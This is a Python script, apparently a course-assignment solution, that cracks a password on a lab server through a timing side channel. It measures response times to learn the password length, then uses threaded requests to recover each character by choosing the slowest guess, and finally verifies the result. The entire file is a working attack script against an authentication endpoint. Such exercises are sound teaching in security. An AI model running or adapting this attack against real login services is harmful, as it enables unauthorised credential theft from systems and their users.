import http.client
import urllib.parse
import time
import io
import subprocess
from concurrent.futures import ThreadPoolExecutor

### --- Global Variables --- ###

DIFFICULTY = 5

BASE_URL = "aoi-assignment1.oy.ne.ro"
SERVER_PORT = 8080

CHARSET = "abcdefghijklmnopqrstuvwxyz"

USERNAME = "326529229" # need to recieve

NUMBER_OF_THREADS = 26

PASSWORD = ""
LENGTH = -1

### ------------------------- ###

def split_charset():
    """
    this function splits the charset into NUMBER_OF_THREADS parts
    """
    global CHARSET, NUMBER_OF_THREADS
    per_thread = len(CHARSET) // NUMBER_OF_THREADS
    if(len(CHARSET) % NUMBER_OF_THREADS != 0):
        per_thread += 1
    parts = [CHARSET[i:i+per_thread] for i in range(0, len(CHARSET), per_thread)]
    return parts



def try_pass(password):
    """
    this function sends an auth request to the server with the given password
    returns a dictionairy structured as follows:
    {
        "Status": <status_code>,
        "Reason": <reason>,
        "Time": <time taken to receive the response>,
        "Data": <response data (single Byte) from the server>
    }
    """
    global USERNAME, DIFFICULTY
    # Handle Request Parameters
    params = {'user': USERNAME, 'password': password, 'difficulty': DIFFICULTY}
    query_string = urllib.parse.urlencode(params)
    # Create the connection
    conn = http.client.HTTPConnection(BASE_URL, SERVER_PORT)
    # Append the query string to the URL path
    path = f"/?{query_string}"
    start = time.perf_counter_ns()
    conn.request("GET", path)
    response = conn.getresponse()
    delta = time.perf_counter_ns() - start

    data = response.read()
    conn.close()
    return {"Status": response.status, "Reason": response.reason, "Time": delta, "Data": data}





def crack_password_length():
    maxTime = 0
    length=-1
    for l in range(33):
        result = try_pass("a" * l)
        if(result.get("Time") > maxTime):
            maxTime = result.get("Time")
            length=l
    return length





def crack_next_char(discovered_length):
    global NUMBER_OF_THREADS
    with ThreadPoolExecutor(max_workers=NUMBER_OF_THREADS) as executor:
        parts = split_charset()
        results = []
        maxTime=0
        maxChar=''
        for part in parts:
            future = executor.submit(worker, part, discovered_length)
            results.append(future)
        for future in results:
            char, time = future.result()
            if time > maxTime:
                maxTime = time
                maxChar = char
    return maxChar


def worker(chars, discovered_length):
    global PASSWORD, LENGTH
    maxTime=0
    maxChar=''
    for char in chars:
        result = try_pass(PASSWORD + char + "a" * (LENGTH-discovered_length-1))
        if result.get("Time") > maxTime:
            maxTime = result.get("Time")
            maxChar = char
    return (maxChar, maxTime)


    

def main():
    global PASSWORD, LENGTH
    # to warm up the connection
    try_pass("!")
    # first step - exploit the server's length validation
    LENGTH = crack_password_length()
    print(f"Password length: {LENGTH}")
    # second step - crack the password char by char
    discovered_length = 0
    while len(PASSWORD) < LENGTH:
        PASSWORD += crack_next_char(discovered_length)
        discovered_length += 1
        print(f"Password so far: {PASSWORD}")
        
    check = try_pass(PASSWORD).get("Data")    
    if check == b'1':
        print(f"Password found: {PASSWORD}")
    else:
        print("Password not found")
    
        

if __name__ == '__main__':
    main()
